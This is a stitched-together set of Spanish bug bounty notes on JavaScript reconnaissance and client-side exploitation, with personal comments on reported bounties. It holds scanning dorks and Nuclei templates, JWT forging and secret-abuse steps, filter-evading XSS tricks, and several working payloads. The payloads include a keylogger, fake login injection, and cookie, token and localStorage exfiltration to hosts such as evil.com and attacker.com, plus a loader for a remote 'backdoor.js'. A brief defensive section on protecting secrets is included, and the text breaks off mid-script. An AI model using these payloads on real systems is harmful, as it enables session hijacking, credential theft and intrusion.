Nombres de variables aleatorias (por ejemplo, _0x12abf1)
Llamadas de función codificadas ( eval(atob(...)))
Envoltura de funciones y manipulación de cadenas
Usar:

de4jspara decodificar
Chrome DevTools para establecer puntos de interrupción e inspeccionar variables
Cambio de nombre manual para mayor claridad
Depuración en DevTools
Abra DevTools del navegador (pestaña Fuentes)
Imprima con precisión ( {}icono) cualquier script empaquetado
Establecer puntos de interrupción en fetch()llamadas interesantes
Rutas de funciones de seguimiento




Abuso de banderas de características
Puede encontrar:

Copiar
if (window.localStorage.getItem("enableBeta") === "true") {
   renderBetaUI();
}
Disparador a través de DevTools:

Copiar
localStorage.setItem("enableBeta", "true"); location.reload();
O comprobar si los parámetros de URL activan flujos ocultos:

Copiar
<https://target.com/dashboard?debug=true>
3. Identificación de puntos finales obsoletos o heredados
Muchas aplicaciones web conservan el soporte heredado:

Copiar
/v1/user/update
/v2/user/update
A veces, /v1/la lógica carece de autenticación o validación modernas. JS podría exponer un comportamiento alternativo:

Copiar
if (version === 'v1') useOldHandler();
Intente acceder directamente a rutas más antiguas para comprobar si hay ataques de degradación.

4. Consultas ocultas de GraphQL
Compruebe si JS contiene operaciones GraphQL:

Copiar
query getUserData($id: ID!) {
   user(id: $id) {
      email, role, token
   }
}
Los desarrolladores suelen incluir consultas de introspección, ejemplos de variables o esquemas completos en paquetes de JavaScript. Úsalos para crear ataques GraphQL personalizados.

Estudios de casos del mundo real
Caso: Ladrón de fichas ocultas
Un investigador encontró esto en JS:

Copiar
const token = window.localStorage.getItem("authToken");
fetch("<https://attacker.com/collect>", { method: "POST", body: token })
Resultó ser un complemento malicioso incluido por error, lo que provocó una violación de datos y una recompensa de $3,000.

Caso: Escalada de API heredada
Se utilizó un SPA /v2/checkout, pero JS hizo referencia a un obsoleto /v1/checkout:

Copiar
if (!useNewFlow) return callLegacy();
El punto final v1 aceptó códigos de cupón sin validación, lo que generó un error lógico y una recompensa de $1200.

Ideas de automatización
Crea un script personalizado que:

Descargas archivos JS
Embellece y escanea en busca de palabras clave sensibles.
Extrae puntos finales de API y consultas GraphQL
Alternancias de depuración de banderas y banderas de características
Utilice GitHub Actions o un trabajo cron para repetir esto semanalmente para alcances grandes.

Consejos para la elaboración de informes
Al escribir su informe:

Mostrar fragmento de JS original
Resalte la función o punto final oculto
Demostrar el impacto: nivel de acceso, exposición de datos, lógica ignorada
Proporcionar pasos de reproducción (DevTools, llamadas API, indicadores de almacenamiento local)
Incluir capturas de pantalla/vídeos

Conclusión
La combinación del reconocimiento profundo con la ingeniería inversa de JavaScript permite acceder a un nivel superior de reconocimiento de errores. Es un proceso lento, detallado y a menudo frustrante, pero la recompensa vale la pena. Con este enfoque, no solo se encuentran errores, sino que se descubre la arquitectura oculta de una aplicación.

Las aplicaciones web modernas filtran mucho más de lo que los desarrolladores esperan. Su JavaScript revela la intención, la estructura y los secretos. Solo hay que mirar.
Tipo de tecnología en la que centrarse más

Aplicación React
Vue.js
Aplicación angular
Aplicación Next.js
Basado en Webpack
Aplicación basada en Vite
Proyectos de empaquetadora de paquetes


FOFA Dorking

👉 sitio: es.fofa.info

Copiar
body=".js.map"
body="# sourceMappingURL"
body="sourceMappingURL"
body="sourceMappingURL=" && body=".js.map"
body="\"version\":3" && body="\"sources\":" && body="\"mappings\":"
body="main.js.map"
body="app.js.map"
body="bundle.js.map"
body="index.js.map"
body="vendor.js.map"
body="chunk.js.map
body="runtime.js.map"
body="polyfills.js.map"

#target filtering
existing_dork && domain="example.com"



ZoomEye Dorking

👉 sitio: zoomeye.ai

Copiar
http.body=".js.map" && domain="example.com"
http.body="# sourceMappingURL" && domain="example.com"
http.body="sourceMappingURL" && domain="example.com"

#just replace the fofa dorks from body= with http.body=, rest is same



 Plantilla básica de núcleos

Copiar
id: js-map-keyword-detected

info:
  name: JS Map Keyword Detection
  author: Legion Hunter
  severity: info
  description: Detects if ".js.map" appears in the HTML response body of a GET request.
  tags: exposure,jsmap,files

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers:
      - type: word
        words:
          - ".js.map"
        part: body
🔖 Plantilla de núcleos avanzada

Copiar
id: exposed-sourcemap-files

info:
  name: Exposed JavaScript Source Map Files
  author: Legion Hunter
  severity: info
  description: Detects exposed .js.map files that may contain original source code
  metadata:
    verified: true
    max-request: 3
  tags: exposure,sourcemap,javascript,files

http:
  - method: GET
    path:
      - "{{BaseURL}}/{{path}}"
      - "{{BaseURL}}/static/js/{{path}}"
      - "{{BaseURL}}/assets/js/{{path}}"
    
    payloads:
      path:
        - "main.js.map"
        - "app.js.map"
        - "bundle.js.map"
        - "index.js.map"
        - "vendor.js.map"
        - "chunk.js.map"
        - "runtime.js.map"
        - "polyfills.js.map"
        - "main.{{randstr}}.js.map"
        - "app.{{randstr}}.js.map"
    
    attack: pitchfork
    
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"version":'
          - '"sources":'
          - '"sourcesContent":'
          - '"mappings":'
        condition: and
      
      - type: word
        part: header
        words:
          - "application/json"
          - "text/plain"
        condition: or
      
      - type: status
        status:
          - 200
    
    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '"file":\s*"([^"]+)"'
          - '"sources":\s*\[([^\]]+)\]'
        name: source_info

  - method: GET
    path:
      - "{{BaseURL}}/{{js_file}}.map"
    
    payloads:
      js_file:
        - "main.js"
        - "app.js"
        - "bundle.js"
        - "index.js"
        - "vendor.js"
    
    attack: pitchfork
    
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"version":'
          - '"sources":'
          - '"mappings":'
        condition: and
      
      - type: status
        status:
          - 200

  - method: GET
    path:
      - "{{BaseURL}}"
    
    matchers:
      - type: regex
        part: body
        regex:
          - 'sourceMappingURL=([^\\s]+\\.js\\.map)'
        name: sourcemap_url
    
    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - 'sourceMappingURL=([^\\s]+\\.js\\.map)'
        name: found_sourcemap
Debe comenzar a intentar personalizar las plantillas según su comprensión o si tiene acceso a los modelos LLM premium de alta precisión.

⚙️ Paso a paso cómo podemos proceder para un objetivo en particular

Copiar
subfinder -d example.com -all -recursive > subs.txt
waymore -i example.com -mode U -oU waymore_urls.txt
nuclei -l subs.txt -t /path/to/templates/template-name.yaml
nuclei -l waymore_urls.txt -t /path/to/templates/template-name.yaml


https://github.com/denandz/sourcemapper EXTRACTOR DE SOURCEMAP.
https://github.com/midoxnet/mapperplus MapperPlus facilita la extracción de código fuente de una colección de objetivos que tienen archivos .js.map expuestos públicamente.
NADA interesante pero si Este archivo reveló lógica de backend, típicamente escrita en ASP (Active Server Pages )
Qué puedes extraer:
API Keys:Firebase, GCP, AWS, Stripe, Mapbox, etc.
Tokens:JWT, tokens de portador OAuth, tokens de actualización
PII: Correos electrónicos, números de teléfono, números de cuenta
Internal Logic: Verificaciones de roles, variaciones de puntos finales
CI/CD Secrets:Nombres de repositorios, artefactos de compilación, dominios de desarrollo


Descodificación de ADN": extracción de datos confidenciales de JS
🔍Qué buscar:
api_key, secret, auth, access_token, jwt,client_id
phone=, email=, user_id,account_number
.git, ci/, internal, staging, localhost:,dev.


¿Qué causa estas fugas?
Desarrolladores que utilizan .envpero crean aplicaciones React/Vue que los exponen
Olvidar eliminar las configuraciones de depuración antes de enviar a producción
Tokens codificados para puesta en escena → promovidos a producción sin cambios
CI/CD agregando cadenas de versión e información del repositorio en variables de ventana
Variables de entorno ( REACT_APP_, NEXT_PUBLIC_, etc.)

Supongamos que encuentra un JWT aparentemente válido en un archivo JS. Esto es lo que puede hacer:

Paso a paso:

Decodifica el JWT usando https://jwt.io o jwt-tool:

Inspeccionar la carga útil: buscar admin: true, userid, email, scope, etc.
Reprodúzcalo usando Burp o Postman contra un punto final de API.
Intente modificarlo y volver a firmarlo si alg: noneestá presente (error de configuración común):
Copiar
{
  "alg": "none",
  "typ": "JWT"
}
Fuerza bruta para recuperar el secreto HMAC con herramientas como jwt-crackero hashcat.
Otros escenarios:

Utilice tokens portadores codificados para realizar llamadas API como administrador.
Abusar de las credenciales de Firebase o S3 para leer/escribir datos públicos.
Combine con configuraciones erróneas de CORS para realizar acceso a API de origen cruzado.

Buscar:

Funciones ofuscadas como a('reset-password')or('/admin')
Utilice embellecedores JS: js-beautify,prettier
Intente resolver fragmentos de Webpack para exponer la lógica modular
Una vez que comprenda cómo se comunica el front-end con el back-end, podrá:

Solicitudes de falsificación
Acceder a rutas de administración no protegidas
Reproducir solicitudes de API como otros usuarios
Consejos profesionales para un mejor reconocimiento de JS

Compruebe siempre los archivos JS archivados (Wayback, gau, etc.)
No ignore el código minimizado: embellezcalo
Mira JS externo desde herramientas de terceros (widgets de chat, complementos)
Esté atento a secretos ofuscados o blobs Base64
Tenga paciencia: una línea de JS puede valer miles
Busque en las carpetas /scripts, /static, /js/, y/assets/

Truco extra:
Utilice curlo wget+ js-beautifypara imprimir JS de forma ordenada antes de analizar:

Copiar
curl https://target.com/assets/main.js | js-beautify - > pretty.js
se trata sobre un filtracion de token valido de BITBUCKET_READ_TOKEN de cual pudo descargarse todos los repos presentes que contenian codigo del servidor etc.Bounty 4k. util explica que comando utlizo para enumerar todos los proyectos repositorio etc.

Obtener información del espacio de trabajo

Para enumerar todos los repositorios disponibles en el espacio de trabajo, ejecute el siguiente comando:
curl https://api.bitbucket.org/2.0/repositories/workspaceNmae-Here?page=1 --header "Authorization: Bearer <BITBUCKET_READ_TOKEN>"
Esto devolverá información sobre todos los repositorios en el espacio de trabajo.

Paso 3: Obtener información del repositorio

Para recuperar información sobre un repositorio específico, utilice el siguiente comando:
curl https://api.bitbucket.org/2.0/repositories/workspaceNmae-Here/repository-Name-Here --header "Authorization: Bearer <BITBUCKET_READ_TOKEN>"

Paso 4: Obtener información del proyecto

Para buscar un proyecto, utilice la clave del proyecto (por ejemplo, EHP) en la consulta:
curl "https://api.bitbucket.org/2.0/repositories/workspaceNmae-Here?q=project.key%3D%22EHP%22" \ --header "Authorization: Bearer <BITBUCKET_READ_TOKEN>"

Paso 5: Clonar cada repositorio

Para clonar un repositorio, use el siguiente comando:
git clone https://x-token-auth:<BITBUCKET_READ_TOKEN>@bitbucket.org/workspaceNmae-Here/repository-Name-Here.git
>Reemplazar <BITBUCKET_READ_TOKEN>con su token completo.
nada interesante.
nada.
nada.
Sigue el flujo, no solo el código
En lugar de leer un archivo JS de arriba a abajo, pregunte:

¿Dónde ingresan los datos ? (por ejemplo, entradas de formulario, parámetros de consulta)
¿Cómo se procesa ? (por ejemplo, codificación, hash, cifrado)
¿Dónde sale ? (por ejemplo, llamadas API, cookies, almacenamiento local)
Piensa como un paquete. ¿Cómo se movería tu carga útil a través del JS?

🧩 2. Asignar JS al comportamiento del backend
Cada .fetch()llamada, cada axios.post(), es una pista para el diseño del backend:

¿Autorización? →/api/login
¿Subir archivo? →/v1/user/avatar/upload
¿Comprobación de roles? →if (user.role === 'admin')
JS es la documentación de tu API disfrazada , especialmente cuando Swagger no está expuesto.

🕵️ 3. Busca la confianza mal depositada
Frontend JS a menudo revela:

Validación del lado del cliente (sin verificación del servidor)
Lógica de reutilización de tokens
Banderas ocultas para funciones "beta" o "administrativas"
Todo aquello en lo que el frontend confía pero que el servidor no vuelve a validar es una puerta que espera ser abierta de una patada.

🎯 4. Apunta a los supuestos más débiles
Si JS asume:

El token siempre es válido ✅
El rol del usuario siempre es preciso ✅
El correo electrónico fue verificado ✅
…eso es una suposición de seguridad . Y las suposiciones de seguridad son donde nacen los errores.

🧠 5. Deja que las indicaciones te ayuden a pensar de manera diferente
La IA no solo ahorra tiempo: también te proporciona un segundo cerebro:

Uno que no se cansa de leer 20.000 líneas de JS
Alguien que pueda explicar los flujos de cifrado en un lenguaje sencillo.
Uno que ayuda a encadenar lógica no relacionada en rutas de ataque.
Explicaque hasta los frame mas importante como react, angular etc pueden 
a ser vulnerables con sink doom.


1. React.js
Fregadero común:dangerouslySetInnerHTML
Problema: Los desarrolladores asumen incorrectamente que los datos están desinfectados.
Ejemplo de explotación:

< div  dangerouslySetInnerHTML = {{  __html:  ubicación.hash }} />
Si el hash contiene <img src=x onerror=alert(1)>, se ejecutará.

2. Vue.js
Hundir:v-html
Si se utiliza con una entrada no desinfectada, se produce un error XSS.
Ejemplo de explotación:

< div  v -html = "contenido malicioso " > </div>
Las cargas útiles desde URL o API de backend pueden representar HTML sin escape.

3. Angular.js (1.x)
Si bien Angular realiza un escape consciente del contexto, los desarrolladores pueden anularlo.
Caso vulnerable:

< span  ng-bind-html = "HTML no confiable" > </ span >
El uso $sce.trustAsHtml()incorrecto puede exponerlo al riesgo de XSS.

4. Aplicaciones basadas en jQuery
Hundir:$(selector).html(untrusted_input)
La manipulación de jQuery a menudo omite la revisión de seguridad
Consejo: Busque .html(, .append(, o .write(dentro de los scripts.




¿Por qué los desarrolladores utilizan DOM?
Para actualizar el contenido sin refrescar la página (por ejemplo, SPA)
Para validación de formularios , interacción de UI, animaciones
Para cargar datos de forma asincrónica mediante AJAX o Fetch
Habilite aplicaciones web ricas e interactivas
Dónde se utiliza:
Código frontend de JavaScript: document.getElementById(), innerHTML, location.href, etc.
Lógica basada en eventos y actualizaciones de páginas
meh.
nha, pagaron bounty 8k pero nada de otro mundo la metodologia.
Automatización de ataques con bots de JavaScript
Los piratas informáticos utilizan navegadores sin cabeza como Puppeteer o Playwright con JavaScript personalizado para:

Automatizar los intentos de inicio de sesión
Realizar pruebas XSS de fuerza bruta
Extraer contenido y analizar encabezados CSP
Ejemplo:

Copiar
const puppeteer = require('puppeteer');
(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto('https://target.com');
  await browser.close();
})();
Cuando se trata de explotar JavaScript de forma creativa , pocas mentes son tan ingeniosas como Gareth Heyes. Su libro "JavaScript para Hackers" está repleto de técnicas alucinantes que evaden WAF y descifran el análisis sintáctico, difuminando la línea entre el arte y el ataque. A continuación, se presentan los hacks de JavaScript más innovadores y creativos que puedes usar para evadir filtros , activar la ejecución en contextos inusuales y manipular el navegador a tu antojo .

Enfoque único de Gareth Heyes
1. instanceof+ Symbol.hasInstancepara llamar a funciones
Al utilizar el instanceofoperador de forma creativa con Symbol.hasInstance, puede ejecutar código desde una cadena sin paréntesis.

Copiar
'alert(1)' instanceof { [Symbol.hasInstance]: eval };
// Executes alert(1)
Por qué funciona: instanceofllama a la función detrás de Symbol.hasInstance, pasando el valor de la izquierda como argumento.

2. Cadenas de plantilla etiquetadas + Constructor de funciones + Comillas triples invertidas
Puede generar y ejecutar instantáneamente funciones arbitrarias sin usar eval, utilizando plantillas etiquetadas con y comillas triples .Function

Copiar
Function`x${'alert(1337)'}```;
// Instantly creates and runs alert(1337)
Esto parece extraño, evita los paréntesis y puede evadir los filtros XSS estáticos en algunas aplicaciones.

3. onerror+ throwcomo un disparador de evaluación indirecta
Establezca onerroren eval, luego throwuna cadena personalizada para ejecutar código arbitrario sin() .

Copiar
onerror = eval;
throw "=alert(1)";
Para vencer los filtros de caracteres, puedes utilizar separadores de línea/párrafo Unicode:

Copiar
eval("onerror=\u2028eval\u2029throw '=alert(1)'");
4. Reflect.apply.callpara la ejecución de funciones ocultas
Al aprovechar Reflect.applyy call, puede invocar cualquier función con control total sobre thislos argumentos y , todo sin paréntesis .

Copiar
Reflect.apply.call`${alert}${window}${[1337]}`;
// Calls alert(1337) stealthily
Por qué es brillante: Esto evita muchos filtros ingenuos que buscan llamadas de funciones directas.

5. Reemplazar valueOfo toStringactivar alertas mediante coerción de tipo
Secuestrar el tipo de JS para llamar indirectamente :alert

Copiar
valueOf = alert;
window + 1; // Triggers alert()
toString = alert;
window + ''; // Also works
Sin paréntesis. No hay llamada de función obvia.

6. Llamadas alertmediante .replace()plantillas etiquetadas
Puedes abusar String.prototype.replacede una plantilla etiquetada para llamar a una alerta con una cadena coincidente :

Copiar
'a'.replace`a${alert}`;
// Triggers alert('a')
Para controlar el valor pasado:

Copiar
'a'.replace.call`1${/./}${alert}`;
// Triggers alert('1')
7. Cadenas de plantilla anidadas en la parte superior
Puede anidar cadenas de plantillas infinitamente , ejecutando cargas útiles profundamente ofuscadas :

Copiar
`${`${`${`${alert(1)}`}`}`}`;
// Still triggers alert(1)
Esto es visualmente caótico, rompe los filtros y confunde al analizador.

8. Shebang ( #!) como comentario de JavaScript para cargas útiles poco claras
Descubierto mediante fuzzing, #!en la parte superior de un archivo JS se trata como un comentario.

Copiar
#!alert(1337)
Si no hay ningún carácter antes, ignora el motor JS como si fuera una línea de comentario legítima. ¡Qué engaño!

9. Fuzzing dinámico de protocolos para javascript:ejecución
Heyes utilizó pruebas de puntos de código para encontrar caracteres no visibles permitidos en javascript:los enlaces:

Copiar
anchor.href = `${String.fromCodePoint(12)}javascript:alert(1)`;
// Still triggers alert()
Los navegadores analizan esto a pesar del carácter invisible, rompiendo las suposiciones de los limpiadores de enlaces.

10. Ofuscación de JavaScript no alfanumérico
Al usar trucos de escape hexadecimales, octales y Unicode, puedes escribir cargas útiles sin palabras clave reconocibles :

Copiar
eval('\x61lert(1)'); // \x61 = 'a'
eval('\141lert(1)'); // Octal \141 = 'a'
eval('\u0061lert(1)'); // Unicode
Combine los tres y tendrá cargas útiles que perforan el WAF y que parecen completamente inofensivas.





Manipulación avanzada del DOM para phishing y clickjacking
JavaScript permite a los atacantes clonar formularios de inicio de sesión , superponer botones falsos o redirigir a los usuarios sin recargar la página.

Inyección de formularios de inicio de sesión falsos
Copiar
document.body.innerHTML = '<form action="http://evil.com"><input name="user"><input name="pass"><input type="submit"></form>';
Clickjacking con JavaScript
Copiar
<iframe src="https://target.com" style="opacity:0;position:absolute;z-index:999;"></iframe>
Con un posicionamiento preciso z-index, el atacante puede engañar a los usuarios para que hagan clic en elementos ocultos.

Registro de teclas con JavaScript
Al incorporar un keylogger a través de XSS o scripts inseguros, los atacantes pueden registrar cada pulsación de tecla:

Copiar
document.onkeypress = function(e){
  fetch('http://evil.com/log?c=' + e.key);
}
Esto se puede combinar con el volcado de localStorage o sessionStorage para una extracción completa de datos del cliente.

Escaneo de puertos desde el navegador
JavaScript puede ejecutar escaneos de puertos internos ocultos utilizando elementos HTML como <img>o <iframe>.

Copiar
var ports = [80, 443, 8080];
ports.forEach(function(port) {
  var img = new Image();
  img.src = "http://192.168.0.1:" + port;
});
Esta técnica se utiliza en el reconocimiento de red interna basado en navegador .

Evitar la validación del lado del cliente
JavaScript permite a los atacantes eludir las validaciones de formularios realizadas en el lado del cliente:

Copiar
document.querySelector("form").submit();
O modificar los valores del campo directamente:

Copiar
document.querySelector("#price").value = 1;
Si el servidor no valida las entradas de forma independiente, esto conduce a una escalada de privilegios o transacciones no autorizadas .

Ataques CSRF con JavaScript
Cuando no existen protecciones CSRF, se puede usar JavaScript para falsificar solicitudes no autorizadas:

Copiar
fetch("https://victim.com/change-email", {
  method: "POST",
  credentials: "include",
  body: "email=attacker@example.com"
});
Esto utiliza la sesión de la víctima para ejecutar acciones en su nombre.

Toma de huellas dactilares de víctimas con JavaScript
Los piratas informáticos recopilan información mediante scripts de toma de huellas dactilares:

Copiar
console.log(navigator.userAgent);
console.log(screen.width, screen.height);
console.log(navigator.plugins);
Estos datos ayudan a personalizar las cargas útiles o seleccionar exploits específicos del navegador.

Conectando navegadores con BeEF Framework
Browser Exploitation Framework (BeEF) es una poderosa herramienta que utiliza JavaScript para atrapar víctimas y lanzar ataques del lado del cliente .
Interesante es un xss simple pero como lo logro reddit interesante con ese parametro de redirect que se activa luego de la autenticacion 500 bounty.
Mejores prácticas para la reconstrucción de JavaScript

Siempre embellece/minimiza JS con herramientas como js-beautify.
Utilice un proxy local para interceptar JS cargado dinámicamente.
Combine análisis estático y dinámico.
No olvide los mapas fuente (archivos .map): pueden revelar el código fuente completo.
Interesante pudo ingresar como admin mediante la exposicion de la HS256 (clave simétrica) se usa ampliamente, pero si la clave se filtra, se acabó el juego. solo creo un usuario le saco el jwt Reemplacé el JWT existente en LocalStorage con el falsificado, actualicé /admin…
interesante websocket xss esta bueno con colaborator de burp suite.
ya que se comunica con las demas ventanas sin restriccion alguna.
: Observando los jugosos archivos JS
No todos los archivos JS merecen tu atención. Filtré bibliotecas aburridas como:

/jquery.min.js
/bootstrap.bundle.js
/react.production.min.js

/static/js/authHandler.js
/assets/scripts/paymentFlow.js
/cdn/app/main-prod.min.js
(Por lo general, están codificados a mano = ¡ hay una alta probabilidad de encontrar algo )

Consejo adicional: Técnicas avanzadas para la divulgación de información confidencial
🔹 Patrones de coincidencia de expresiones regulares :

Copiar
regex
['"][A-Za-z0-9_\-]{16,}['"]
Captura secretos codificados en base64.

🔹 Encontrar código comentado :

Copiar
grep -oP '(?<=//).+' all_javascript_dump.txt
Porque a veces los desarrolladores dejan hojas de ruta completas en los comentarios.
esta bueno encontre un js cometario con url no listada ingreso 
luego analizo otra ves el js y encontre el token del admin lo ingreso 
y boom admin.
analisis de js encontro una logica de manejo de id en la url lo cambio y le retorno metadata oculta etc idor.
xss ciego carga util, en img.

"><img src=1 onerror="url=String.fromCharCode(104,116,116,112,...)+encodeURIComponent(document['cookie']);xhttp= new XMLHttpRequest();xhttp.open('GET',url,true);xhttp.send();">
Carga útil 2: Shell de ejecución de JS completo (también conocido como RCE de JavaScript)
¿Qué pasaría si hiciéramos de esto un XSS a RAT?

Copiar
(() => {
  fetch('https://evil.com/log?u=' + navigator.userAgent + '&d=' + document.domain);
  let script = document.createElement('script');
  script.src = 'https://evil.com/backdoor.js';
  document.body.appendChild(script);
})();
Resultado: Puerta trasera JS instalada. Prueba de concepto de secuestro de sesión implementada.

El premio gordo: acceso al almacenamiento local y a los JWT
Encadenando un poco más eval()de magia:

Copiar
fetch('https://evil.com/ls?data=' + JSON.stringify(localStorage))
✅ Conseguí:

Token de autenticación JWT
Claves API almacenadas en caché por el frontend
Preferencias del usuario (algunas con modos de pago)
Tokens de sesión SSO
Sí. Todo porque eval()confiamos en todo lo que viene de la API.

🎯 Carga útil final (para informe):
Copiar
{
  "action": "fetch('https://attacker.com/steal?data=' + btoa(document.cookie + '|' + JSON.stringify(localStorage)))"
}
Impacto :

DOM XSS → Ejecución completa de JS
Toma de control de sesión
Tokens de acceso + JWT robados
Secuestro de SSO (vinculado a Google Workspace)
RCE de frontend a través de una puerta trasera JS
Divulgación de datos de localStorage
Podría secuestrar a CUALQUIER usuario conectado
Lecciones aprendidas
eval()Nunca es seguro, especialmente con datos no validados.
El reconocimiento masivo de archivos JS archivados es una mina de oro.
LocalStorage + cookies = objetivos jugosos.
El XSS basado en DOM no está muerto: simplemente evolucionó.
meh, encontro api key quemada, activa entro miro que mas puede hacer crear acciones etc esta bueno.
pues que dire analizando un js encontre un parametro de redirect externo y lo probe no funciono lo redirigio al logyn pero se logeo y boom funciono creo un sitio falso parecido al logyn y bueno lo subio a su githubpage y explico y dio mas impacto al informe valido.
analizando un js encontre un parametro de busqueda inyecto metacaracteres y no fueron codificados o escapado previamente en el doom aplico xss y boom lo escalo robo de cookie si tenia csp pero debil.
super bueno varios controladores de eventos super para utilizar en carga util y mas recomendado.
brutal con un simple api key quemada en js logro acceder a varios recursos criticos y ademas de rce etc simple potente bueno.
En busca de sumideros
Descargué el JS y lo escaneé manualmente.

Dentro, vi la santísima trinidad de los pecados de DOM XSS :


var userInput = location.hash.substring(1);
document.getElementById("profileName").innerHTML = userInput;

PoC completamente armado (Explotación realista)
Carga útil:

Copiar
https://app.target.com/#<svg onload=fetch('https://myserver.com?c='+document.cookie)>
💀 Esto sería:

Robar cookies de sesión silenciosamente
Envíalo a mi servidor (controlado)
Es posible tomar control total de la cuenta con solo un clic de la víctima
(¡Sí, mi servidor registró las cookies maravillosamente! 



Consejos avanzados adicionales para DOM XSS
🔹 Patrones de expresiones regulares personalizados :


regex
(location\.\w+|document\.\w+)\s*=\s*[^\n;]+

✅ Centrarse en:

location.hash
location.search
document.URL
document.referrer
nfracciones en el mundo real
🔥 Uber (2016): Las credenciales de AWS expuestas en GitHub provocaron una filtración masiva de datos.
🎮 EA Games : las claves de AWS encontradas en repositorios públicos permitieron el acceso a los servidores del juego.
💳 Pasarelas de pago : varios investigadores obtuvieron recompensas por errores por encontrar secretos de Stripe.
Consejo sobre recompensas por errores
En plataformas como HackerOne o Bugcrowd, estos informes suelen ser muy valiosos , siempre que la clave sea lo suficientemente sensible.

Ejemplos de títulos de informes:

Exposed AWS Secret Key in public JS file
Hardcoded Stripe secret in production JS
Firebase DB exposed without auth in JS config
🔐 Cómo proteger secretos (para desarrolladores)
✅ 1. Nunca codifiques secretos en el código frontend
Coloque únicamente claves que sean públicas (por ejemplo, la clave del navegador de Google Maps).

✅ 2. Utilice variables de entorno
Mantenga los secretos en el servidor, no en el cliente.

Copiar
// BAD 👎
const apiKey = "sk_live_secretkey";
// GOOD 👍
app.get('/config', (req, res) => {
  res.json({ publicKey: process.env.STRIPE_PUB_KEY });
});
✅ 3. Establecer restricciones de claves
Utilice paneles (por ejemplo, Google Cloud, AWS IAM) para restringir el uso mediante:

Dirección IP
Referente (dominio)
Expiración
✅ 4. Audita tu base de código
Utilice gitleaks, truffleHog, o el escaneo secreto de GitHub para detectar secretos expuestos antes de enviar código.

✅ 5. Rota los secretos con frecuencia
Si algo gotea, no se asuste: simplemente rótelo lo antes posible.
super bueno codigo para extrar todos los nombre de archivos js extensiones y demas solo navegando normal estatico dinamico doom etc configuracion como un marcado etc y solo activas y listo interesante.


javascript:(function(){var scripts=document.getElementsByTagName("script"),regex=/(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))/g;const results=new Set;for(var i=0;i<scripts.length;i++){var t=scripts[i].src;""!=t&&fetch(t).then(function(t){return t.text()}).then(function(t){var e=t.matchAll(regex);for(let r of e)results.add(r[0])}).catch(function(t){console.log("An error occurred: ",t)})}var pageContent=document.documentElement.outerHTML,matches=pageContent.matchAll(regex);for(const match of matches)results.add(match[0]);function writeResults(){results.forEach(function(t){document.write(t+"<br>")})}setTimeout(writeResults,3e3);})();

tiene algunas limitacion como no captura del todo archivos generados dinamicamte etc entres otros satura con mcuas peticioens y innter etc rompe el codiugo actual lo sobreescribe y tambien tiene limitacion de extensiones a buscar lo mejore un poco quedo asi:

(async function(){
  // ==== CONFIG ====
  const outputMode = 'overlay'; // 'overlay' | 'console' | 'download' | 'document'
  const concurrency = 5; // peticiones concurrentes max
  const captureFetchResponses = true; // hook para capturar fetch/XHR (útil en lab)
  const includeExtensions = ['.js','.mjs','.json','.map','.css','.wasm','.svg','.txt','.xml','.html'];
  const timeoutMs = 10000; // timeout por fetch
  // ==================

  // regex: captura URLs relativas y absolutas con extensiones (entre comillas)
  const extPattern = includeExtensions.map(e=>e.replace('.','\\.') ).join('|');
  const regex = new RegExp('(?<=(["\'`]))(?:https?:\\/\\/[^"\'`\\s]+|\\/[\\w\\-\\.\\/\\?\\=\\&\\%\\#]+|[\\.]{0,2}\\/[\\w\\-\\.\\/\\?\\=\\&\\%\\#]+)(?:' + '(?:' + extPattern + ')(?:\\b|[\\?\\#])' + ')', 'g');

  const results = new Map(); // url -> {sourceSet: Set(), body?}
  const addUrl = (u,source)=>{ if(!u) return; if(!results.has(u)) results.set(u,{sources:new Set(), body:null}); results.get(u).sources.add(source); };

  // safe fetch with timeout and returning text if CORS allows
  async function safeFetchText(url){
    try{
      const controller = new AbortController();
      const t = setTimeout(()=>controller.abort(), timeoutMs);
      const resp = await fetch(url, {cache:'no-store', signal: controller.signal});
      clearTimeout(t);
      // if response is opaque (no-cors) we can't read text
      if(resp.type === 'opaque') return {ok:false, opaque:true};
      if(!resp.ok) return {ok:false, status: resp.status};
      const text = await resp.text();
      return {ok:true, text};
    }catch(e){
      return {ok:false, error: String(e)};
    }
  }

  // promise pool
  async function pool(tasks, limit){
    const out = [];
    const executing = [];
    for (const task of tasks){
      const p = Promise.resolve().then(()=>task());
      out.push(p);
      executing.push(p);
      if(executing.length >= limit){
        await Promise.race(executing).catch(()=>{/* swallow */});
        // remove settled
        for (let i = executing.length-1;i>=0;i--){
          if (executing[i].then) {
            // no direct way to test settled; prune by reassigning
          }
        }
        // Quick prune: keep only pending via filter by unresolved (approx)
        executing.splice(0, executing.length - limit + 1);
      }
    }
    return Promise.allSettled(out);
  }

  // get all <script> src and inline script text
  function scanDOM(){
    const scripts = Array.from(document.getElementsByTagName('script'));
    scripts.forEach(s=>{
      if(s.src) addUrl(s.src, 'script.src');
      if(s.textContent) {
        let m;
        while((m = regex.exec(s.textContent)) !== null) addUrl(m[0],'script.inline');
      }
    });
    // scan HTML
    const html = document.documentElement.outerHTML;
    let mm;
    while((mm = regex.exec(html)) !== null) addUrl(mm[0],'html');
  }

  // observe dynamic insertions
  const mo = new MutationObserver(muts=>{
    for(const mu of muts){
      for(const n of mu.addedNodes){
        if(n.nodeType===1){
          if(n.tagName && n.tagName.toLowerCase() === 'script'){
            const src = n.src || null;
            if(src) addUrl(src,'mutation.script.src');
            if(n.textContent){
              let m;
              while((m = regex.exec(n.textContent)) !== null) addUrl(m[0],'mutation.script.inline');
            }
          } else {
            // scan node HTML for matches
            const txt = n.outerHTML || n.textContent || '';
            let m;
            while((m = regex.exec(txt)) !== null) addUrl(m[0],'mutation.node');
          }
        }
      }
    }
  });
  mo.observe(document.documentElement, {childList:true, subtree:true, attributes:false});

  // optional: hook fetch / XHR to record dynamic requests
  function hookNetwork(){
    if(!captureFetchResponses) return;
    // fetch
    const _fetch = window.fetch;
    window.fetch = async function(input, init){
      try {
        const resp = await _fetch.apply(this, arguments);
        try {
          // clone to be able to read body without breaking original
          const clone = resp.clone();
          // attempt to read text if same-origin / CORS allows
          if(clone.type !== 'opaque'){
            const ct = clone.headers.get('content-type') || '';
